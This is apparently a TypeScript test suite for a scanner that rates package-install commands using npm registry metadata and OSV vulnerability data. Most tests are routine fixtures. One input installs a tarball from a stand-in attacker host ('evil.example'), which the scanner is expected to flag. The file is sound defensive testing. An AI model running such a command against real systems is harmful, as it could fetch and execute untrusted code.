import { test } from "node:test";
import assert from "node:assert/strict";
import { enrichInstall, extractTargets } from "./npm.ts";
import type { ScanResult } from "./types.ts";

const NONE: ScanResult = { level: "none", findings: [] };

function json(status: number, body: unknown): Response {
  return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
}

/** npm registry root-doc fixture. */
function regMeta(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    name: "x",
    "dist-tags": { latest: "1.0.0" },
    versions: { "1.0.0": {} },
    time: { created: "2020-01-01T00:00:00.000Z" },
    ...overrides,
  };
}

function stubFetch(
  routes: Array<[string, (url: string, init?: RequestInit) => Response]>,
  calls: string[],
): typeof fetch {
  return ((url: unknown, init?: RequestInit) => {
    const u = String(url);
    calls.push(u);
    for (const [prefix, handler] of routes) {
      if (u.startsWith(prefix)) return Promise.resolve(handler(u, init));
    }
    return Promise.reject(new Error(`unexpected fetch: ${u}`));
  }) as typeof fetch;
}

// --- extraction ---

test("extractTargets: npm install / npm i / npm ci", () => {
  assert.deepEqual(extractTargets("npm install zod express"), [
    { kind: "npm", name: "zod" },
    { kind: "npm", name: "express" },
  ]);
  assert.deepEqual(extractTargets("npm i -D typescript"), [{ kind: "npm", name: "typescript" }]);
  assert.deepEqual(extractTargets("npm ci"), []);
  assert.deepEqual(extractTargets("npm install -g eslint"), [{ kind: "npm", name: "eslint" }]);
});

test("extractTargets: npx takes only the first argument as the package", () => {
  assert.deepEqual(extractTargets("npx create-react-app my-app"), [
    { kind: "npm", name: "create-react-app" },
  ]);
});

test("extractTargets: bun add / yarn add / pnpm add", () => {
  assert.deepEqual(extractTargets("bun add zod"), [{ kind: "npm", name: "zod" }]);
  assert.deepEqual(extractTargets("yarn add @scope/pkg"), [{ kind: "npm", name: "@scope/pkg" }]);
  assert.deepEqual(extractTargets("pnpm add express"), [{ kind: "npm", name: "express" }]);
});

test("extractTargets: scoped names and pinned versions", () => {
  assert.deepEqual(extractTargets("npm install @scope/pkg@1.2.3"), [
    { kind: "npm", name: "@scope/pkg", version: "1.2.3" },
  ]);
  assert.deepEqual(extractTargets("npm install zod@3.22.0"), [{ kind: "npm", name: "zod", version: "3.22.0" }]);
});

test("extractTargets: tarball URLs and git deps", () => {
  assert.deepEqual(extractTargets("npm install https://example.com/x.tgz"), [
    { kind: "url", url: "https://example.com/x.tgz" },
  ]);
  assert.deepEqual(extractTargets("npm install git+https://github.com/x/y.git"), [
    { kind: "git", url: "git+https://github.com/x/y.git" },
  ]);
});

test("extractTargets: pip and cargo installs are recognized (no npm lookup for them)", () => {
  assert.deepEqual(extractTargets("pip install requests==2.31.0"), [{ kind: "pypi", name: "requests" }]);
  assert.deepEqual(extractTargets("cargo install ripgrep"), [{ kind: "crates", name: "ripgrep" }]);
});

test("extractTargets: non-install commands -> []", () => {
  assert.deepEqual(extractTargets("ls -la"), []);
  assert.deepEqual(extractTargets("npm run build"), []);
  assert.deepEqual(extractTargets("git status"), []);
});

// --- enrichment: deterministic findings ---

test("enrichInstall: non-install command -> unchanged, no fetch", async () => {
  const calls: string[] = [];
  const sr = await enrichInstall("ls -la", NONE, stubFetch([], calls));
  assert.equal(sr, NONE);
  assert.equal(calls.length, 0);
});

test("enrichInstall: hasInstallScript -> low supply-chain finding, no OSV call (version unknown)", async () => {
  const calls: string[] = [];
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => json(200, regMeta({ scripts: { install: "node build.js" } }))]],
    calls,
  );
  const sr = await enrichInstall("npm install scripty", NONE, fetchFn);
  assert.equal(sr.findings.length, 1);
  assert.equal(sr.findings[0].id, "cmd-install-script");
  assert.equal(sr.findings[0].severity, "low");
  assert.equal(sr.findings[0].category, "supply-chain");
  assert.equal(calls.length, 1);
});

test("enrichInstall: young package (< 90 days) + install script -> medium", async () => {
  const created = new Date(Date.now() - 10 * 86400000).toISOString();
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => json(200, regMeta({ scripts: { postinstall: "x" }, time: { created } }))]],
    [],
  );
  const sr = await enrichInstall("npm install fresh-script", NONE, fetchFn);
  assert.equal(sr.findings[0].id, "cmd-install-young");
  assert.equal(sr.findings[0].severity, "medium");
});

test("enrichInstall: old package + install script stays low (no age signal)", async () => {
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => json(200, regMeta({ scripts: { preinstall: "x" } }))]],
    [],
  );
  const sr = await enrichInstall("npm install old-script", NONE, fetchFn);
  assert.equal(sr.findings[0].id, "cmd-install-script");
  assert.equal(sr.findings[0].severity, "low");
});

test("enrichInstall: deprecated -> low finding", async () => {
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => json(200, regMeta({ deprecated: "use something else" }))]],
    [],
  );
  const sr = await enrichInstall("npm install legacy", NONE, fetchFn);
  assert.equal(sr.findings[0].id, "cmd-deprecated");
  assert.equal(sr.findings[0].severity, "low");
});

// --- enrichment: OSV ---

function osvVuln(id: string, name: string, fixed: string): Record<string, unknown> {
  return {
    id,
    affected: [
      {
        package: { name, ecosystem: "npm" },
        ranges: [{ type: "SEMVER", events: [{ introduced: "0" }, { fixed }] }],
      },
    ],
  };
}

test("enrichInstall: OSV vuln affecting the requested version -> high", async () => {
  const fetchFn = stubFetch(
    [
      ["https://registry.npmjs.org/", () => json(200, regMeta())],
      [
        "https://api.osv.dev/v1/querybatch",
        (_u, init) => {
          const body = JSON.parse(String(init?.body));
          assert.deepEqual(body, { queries: [{ package: { name: "badpkg", ecosystem: "npm" } }] });
          return json(200, { results: [{ vulns: [osvVuln("GHSA-abc-123", "badpkg", "2.0.0")] }] });
        },
      ],
    ],
    [],
  );
  const sr = await enrichInstall("npm install badpkg@1.0.0", NONE, fetchFn);
  assert.equal(sr.findings.length, 1);
  assert.equal(sr.findings[0].id, "cmd-osv-vuln");
  assert.equal(sr.findings[0].severity, "high");
  assert.match(sr.findings[0].evidence, /GHSA-abc-123/);
});

test("enrichInstall: OSV vuln NOT affecting the requested version -> unchanged", async () => {
  const fetchFn = stubFetch(
    [
      ["https://registry.npmjs.org/", () => json(200, regMeta())],
      ["https://api.osv.dev/v1/querybatch", () => json(200, { results: [{ vulns: [osvVuln("GHSA-xyz", "goodpkg", "2.0.0")] }] })],
    ],
    [],
  );
  const sr = await enrichInstall("npm install goodpkg@2.0.0", NONE, fetchFn);
  assert.equal(sr, NONE);
});

test("enrichInstall: unknown version -> no OSV call at all", async () => {
  const calls: string[] = [];
  const fetchFn = stubFetch([["https://registry.npmjs.org/", () => json(200, regMeta())]], calls);
  const sr = await enrichInstall("npm install plainpkg", NONE, fetchFn);
  assert.equal(sr, NONE);
  assert.equal(calls.length, 1); // registry only
});

// --- enrichment: offline degradation (never "safe", never blocking) ---

test("enrichInstall: registry network failure -> unchanged", async () => {
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => { throw new Error("ECONNREFUSED"); }]],
    [],
  );
  const sr = await enrichInstall("npm install offline-pkg", NONE, fetchFn);
  assert.equal(sr, NONE);
});

test("enrichInstall: registry 500 -> unchanged", async () => {
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => new Response("oops", { status: 500 })]],
    [],
  );
  const sr = await enrichInstall("npm install failing-pkg", NONE, fetchFn);
  assert.equal(sr, NONE);
});

test("enrichInstall: invalid JSON -> unchanged", async () => {
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => new Response("not json at all", { status: 200 })]],
    [],
  );
  const sr = await enrichInstall("npm install broken-json", NONE, fetchFn);
  assert.equal(sr, NONE);
});

test("enrichInstall: registry 404 -> unchanged (unknown is not a signal)", async () => {
  const fetchFn = stubFetch(
    [["https://registry.npmjs.org/", () => new Response("not found", { status: 404 })]],
    [],
  );
  const sr = await enrichInstall("npm install nonexistent-pkg", NONE, fetchFn);
  assert.equal(sr, NONE);
});

test("enrichInstall: OSV failure keeps registry findings, never crashes", async () => {
  const fetchFn = stubFetch(
    [
      ["https://registry.npmjs.org/", () => json(200, regMeta({ scripts: { install: "x" } }))],
      ["https://api.osv.dev/v1/querybatch", () => { throw new Error("timeout"); }],
    ],
    [],
  );
  const sr = await enrichInstall("npm install mixed@1.0.0", NONE, fetchFn);
  assert.equal(sr.findings.length, 1);
  assert.equal(sr.findings[0].id, "cmd-install-script");
});

// --- enrichment: cache ---

test("enrichInstall: same package twice -> cache hit, single registry fetch", async () => {
  let regHits = 0;
  const fetchFn = stubFetch(
    [
      [
        "https://registry.npmjs.org/",
        () => {
          regHits++;
          return json(200, regMeta({ scripts: { install: "x" } }));
        },
      ],
    ],
    [],
  );
  await enrichInstall("npm install cached-pkg", NONE, fetchFn);
  await enrichInstall("npm install cached-pkg", NONE, fetchFn);
  assert.equal(regHits, 1);
});

// --- enrichment: non-registry sources, no network ---

test("enrichInstall: tarball URL from unknown host -> medium, zero fetches", async () => {
  const calls: string[] = [];
  const sr = await enrichInstall("npm install https://evil.example/x.tgz", NONE, stubFetch([], calls));
  assert.equal(sr.findings[0].id, "cmd-tarball-url");
  assert.equal(sr.findings[0].severity, "medium");
  assert.equal(calls.length, 0);
});

test("enrichInstall: git dependency -> low non-registry finding, zero fetches", async () => {
  const calls: string[] = [];
  const sr = await enrichInstall("npm install git+https://github.com/x/y.git", NONE, stubFetch([], calls));
  assert.equal(sr.findings[0].id, "cmd-nonregistry");
  assert.equal(sr.findings[0].severity, "low");
  assert.equal(calls.length, 0);
});

test("enrichInstall: registry-host tarball URL -> unchanged, zero fetches", async () => {
  const calls: string[] = [];
  const sr = await enrichInstall(
    "npm install https://registry.npmjs.org/zod/-/zod-3.22.0.tgz",
    NONE,
    stubFetch([], calls),
  );
  assert.equal(sr, NONE);
  assert.equal(calls.length, 0);
});
